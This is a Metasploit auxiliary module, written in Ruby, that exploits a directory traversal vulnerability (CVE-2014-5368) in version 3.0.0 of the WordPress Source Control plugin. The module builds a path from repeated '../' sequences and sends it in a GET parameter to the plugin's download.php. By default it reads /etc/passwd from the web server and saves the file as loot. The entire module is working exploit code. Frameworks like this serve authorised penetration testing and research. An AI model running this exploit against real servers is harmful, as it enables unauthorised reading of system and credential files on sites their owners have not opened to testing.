##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Auxiliary::Report
  include Msf::HTTP::Wordpress
  include Msf::Auxiliary::Scanner

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'WordPress Source Control Plugin File Read Vulnerability',
      'Description'    => %q{
        This module exploits a directory traversal vulnerability in WordPress Plugin
        Source Control version 3.0.0, allowing to read arbitrary files from the
        system with the web server privileges. This module has been tested successfully
        on Source Control version 3.0.0 with WordPress 4.1.3 on Ubuntu 12.04 Server.
      },
      'References'     =>
        [
          ['WPVDB', '7541'],
          ['CVE', '2014-5368'],
          ['URL', 'http://www.openwall.com/lists/oss-security/2014/08/19/3']
        ],
      'Author'         =>
        [
          'Henri Salo', # Vulnerability Discovery
          'Roberto Soares Espreto <robertoespreto[at]gmail.com>' # Metasploit Module
        ],
      'License'        => MSF_LICENSE
    ))

    register_options(
      [
        OptString.new('FILEPATH', [true, 'The file to read', '/etc/passwd']),
        OptInt.new('DEPTH', [ true, 'Traversal Depth (to reach the wordpress root folder)', 7 ])
      ], self.class)
  end

  def check
    check_plugin_version_from_readme('wp-source-control', '3.1.0')
  end

  def run_host(ip)
    traversal = '../' * datastore['DEPTH']
    filename = datastore['FILEPATH']
    filename = filename[1, filename.length] if filename =~ /^\//

    res = send_request_cgi(
      'method' => 'GET',
      'uri'    => normalize_uri(wordpress_url_plugins, 'wp-source-control', 'downloadfiles', 'download.php'),
      'vars_get' =>
        {
          'path' => "#{traversal}#{filename}"
        }
    )

    if res && res.code == 200 && res.body && res.body.length > 0
      fname = datastore['FILEPATH']

      path = store_loot(
        'wp-source-control.file',
        'text/plain',
        ip,
        res.body,
        fname
      )

      print_good("#{peer} - File saved in: #{path}")
    else
      print_error("#{peer} - Nothing was downloaded. Check the path and the traversal parameters.")
    end
  end
end
